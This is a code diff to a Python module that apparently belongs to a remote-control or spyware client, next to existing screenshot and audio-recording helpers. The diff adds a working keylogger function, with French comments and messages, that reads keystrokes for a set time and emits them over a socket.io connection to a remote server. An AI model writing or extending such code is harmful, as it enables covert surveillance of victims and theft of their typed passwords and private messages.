@@ -1,7 +1,9 @@
 import base64
 import io
+import time
 import wave
 
+import keyboard
 import pyaudio
 import pyautogui
 from PIL import Image
@@ -63,3 +65,25 @@ def save_wave_file(file_io, audio_data):
         wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
         wave_file.setframerate(44100)
         wave_file.writeframes(audio_data)
+
+
+def record_and_send_keyboard_log(duration=10, sio=None):
+    try:
+        print("Enregistrement du keylogger en cours...")
+        start_time = time.time()
+        keyboard_log = {}
+
+        while time.time() - start_time < duration:
+            event = keyboard.read_event()
+            keyboard_log[event.name] = time.time()
+
+        # Convertir le dictionnaire en une liste de tuples (nom de l'événement, horodatage)
+        keyboard_log_list = [(key, value) for key, value in keyboard_log.items()]
+
+        # Émettre l'événement seulement si le journal n'est pas vide
+        if keyboard_log_list and sio:
+            sio.emit('keyboard_response', {'keyboard_log': keyboard_log_list})
+
+        print("Enregistrement du keylogger terminé")
+    except Exception as e:
+        print(f"Échec de l'enregistrement du keylogger: {e}")
